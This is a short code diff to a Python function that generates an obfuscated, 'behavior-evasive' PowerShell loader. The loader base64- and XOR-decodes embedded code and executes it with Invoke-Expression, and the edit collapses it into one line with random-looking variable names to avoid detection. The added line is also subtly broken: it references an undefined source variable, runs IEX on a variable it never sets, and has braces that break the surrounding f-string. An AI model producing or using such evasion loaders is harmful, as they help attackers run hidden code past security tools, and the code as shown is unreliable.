@@ -33,12 +33,8 @@ def generate_payload(user_code, key=23):
     # Obfuscated PowerShell payload
     payload = f"""
 # Obfuscated and behavior-evasive PowerShell Payload
-${v_b64} = {b64_split}
-${v_key} = {key}
-${v_bytes} = [System.Convert]::FromBase64String(${v_b64})
-${v_dec} = for ($i=0; $i -lt ${v_bytes}.Length; $i++) {{ ${v_bytes}[$i] -bxor ${v_key} }}
-${v_out} = [System.Text.Encoding]::Unicode.GetString(${v_dec})
-${{1..1}} | ForEach-Object {{ IEX $v_out }}
+$EExEFW=23;$VxKaBQ=[System.Convert]::FromBase64String($gTmDYy);$WiwQye=for($i=0;$i -lt $VxKaBQ.Length;$i++){$VxKaBQ[$i]-bxor $EExEFW};$oMcPxy=[System.Text.Encoding]::Unicode.GetString($WiwQye);${1..1}|ForEach-Object{IEX $v_out}
+
 """.strip()
 
     return payload
